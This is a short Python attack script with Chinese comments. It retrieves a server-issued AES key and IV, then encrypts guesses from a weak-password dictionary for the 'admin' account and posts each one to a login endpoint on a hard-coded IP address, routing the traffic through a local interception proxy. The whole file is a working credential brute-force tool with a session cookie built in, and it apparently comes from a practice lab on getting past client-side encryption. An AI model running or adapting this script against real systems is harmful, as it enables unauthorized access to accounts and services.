# -*- encoding: utf-8 -*-
# TODO:@ModuleName: AES服务端获取KEY&IV
# TODO:@Author: tomato
# TODO:@Version: Python3.12.0
# TODO:@Time: 2025/8/17 14:34

import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def aes_cbc_encrypt(key: bytes, data: bytes, iv: bytes) -> str:
    """
    AES CBC 加密
    :param key: 密钥 (bytes)
    :param data: 明文数据 (bytes)
    :param iv: 初始化向量 (bytes)
    :return: base64 编码的密文字符串
    """
    aes_cipher = AES.new(key, AES.MODE_CBC, iv)
    cipher_text = aes_cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(cipher_text).decode('utf-8')


headers = {
    'Host': '121.43.105.51:82',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Referer': 'http://121.43.105.51:82/',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'PHPSESSID=9a1d6f53aeda109f7d75b9cb2f4615da',
}

# TODO: 1. 获取服务端生成的 Key 和 IV
response_getvalue = requests.get(
    'http://121.43.105.51:82/encrypt/server_generate_key.php',
    headers=headers
).json()

key = base64.b64decode(response_getvalue['aes_key'])
iv = base64.b64decode(response_getvalue['aes_iv'])

# TODO: 配置代理
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
# TODO: 2. 本地加密数据
with open("弱口令字典.txt", "r", encoding="utf-8") as f:
    lines = f.readlines()
    for line in lines:
        password = line.strip()

        origin_data = f'{{"username":"admin","password":"{password}"}}'.encode('utf-8')
        encrypt_data = aes_cbc_encrypt(key, origin_data, iv)
        # print("本地加密结果:", encrypt_data)

        # TODO: 3. 提交到服务端
        response = requests.post(
            'http://121.43.105.51:82/encrypt/aesserver.php',
            headers=headers,
            json={"encryptedData": encrypt_data},
            proxies=proxies
        )
        print('[状态码]:', response.status_code)
        print('[响应正文]:\n', response.text.encode('utf-8').decode('unicode_escape'))
